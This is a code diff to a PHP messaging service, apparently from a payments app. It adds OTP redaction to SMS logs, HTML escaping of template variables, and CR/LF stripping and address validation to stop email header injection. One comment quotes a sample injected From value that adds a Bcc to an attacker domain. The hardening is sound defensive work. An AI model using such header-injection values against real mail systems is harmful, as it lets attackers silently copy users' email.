@@ -76,7 +76,15 @@ final class CommunicationService
         }
 
         /** @var SmsProviderInterface $provider */
-        $logId = $this->commLog->log($merchantId, 'sms', $to, 'sms.send', $message, $provider->slug(), 'queued');
+        // Redact any run of 4+ digits from the logged body. SMS bodies
+        // routinely carry OTPs, balance amounts, and reset codes; the raw
+        // value is still delivered to the recipient via $provider->send()
+        // below, but only the redacted form is persisted to op_comm_log.body
+        // so that anyone with admin read access cannot read live OTPs.
+        // Short numbers (e.g. "Tk 500") are preserved to keep logs useful
+        // for debugging.
+        $redactedBody = preg_replace('/\d{4,}/', '****', $message);
+        $logId = $this->commLog->log($merchantId, 'sms', $to, 'sms.send', $redactedBody, $provider->slug(), 'queued');
 
         try {
             $result = $provider->send($to, $message);
@@ -151,15 +159,28 @@ final class CommunicationService
      *
      * Triggers the 'communication.template.render' filter to let plugins post-process templates.
      *
+     * When $contentType is 'html' (the default), each scalar variable is HTML-escaped
+     * via htmlspecialchars(ENT_QUOTES|ENT_HTML5, UTF-8) before interpolation so that
+     * caller-controlled values (refund reasons, transaction ids, customer names) cannot
+     * inject <script>, <img>, or other active markup into the rendered HTML body.
+     * When $contentType is 'text' (plain-text SMS body), values are interpolated raw
+     * because SMS clients render body text literally - escaping would just add visible
+     * '&lt;' noise.
+     *
      * @param string $template Plain text or HTML template content.
      * @param array<string, mixed> $vars Variables to replace.
+     * @param string $contentType One of 'html' (escape values) or 'text' (no escaping).
      * @return string Fully compiled message payload.
      */
-    public function renderTemplate(string $template, array $vars): string
+    public function renderTemplate(string $template, array $vars, string $contentType = 'html'): string
     {
+        $escapeHtml = $contentType === 'html';
         $rendered = $template;
         foreach ($vars as $key => $value) {
             $valStr = is_scalar($value) ? (string) $value : '';
+            if ($escapeHtml) {
+                $valStr = htmlspecialchars($valStr, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+            }
             $rendered = str_replace('{{' . $key . '}}', $valStr, $rendered);
         }
         $res = $this->events->applyFilter('communication.template.render', $rendered, $vars);
@@ -233,13 +254,27 @@ final class CommunicationService
      */
     private function fallbackMail(array $message): array
     {
-        $to = $message['to'];
-        $subject = $message['subject'];
+        $to = str_replace(["\r", "\n"], '', $message['to']);
+        $subject = str_replace(["\r", "\n"], '', $message['subject']);
         $body = $message['html'] ?? $message['body'];
         $headers = "Content-Type: text/html; charset=UTF-8\r\n";
 
+        // Reject malformed recipient addresses rather than letting mail()
+        // accept and silently drop them. An invalid $to could otherwise be
+        // smuggled into additional headers via newlines on some MTAs.
+        if ($to === '' || filter_var($to, FILTER_VALIDATE_EMAIL) === false) {
+            return ['success' => false, 'error' => 'Invalid recipient address'];
+        }
+
         if (!empty($message['from'])) {
-            $headers .= "From: {$message['from']}\r\n";
+            // Strip CR/LF from the From header value to prevent header
+            // injection. An admin-controlled mail_from_name such as
+            // "OwnPay\r\nBcc: victim@evil.com" would otherwise cause
+            // every outbound email to BCC the attacker.
+            $from = str_replace(["\r", "\n"], '', (string) $message['from']);
+            if ($from !== '') {
+                $headers .= "From: {$from}\r\n";
+            }
         }
 
         $sent = @mail($to, $subject, $body, $headers);
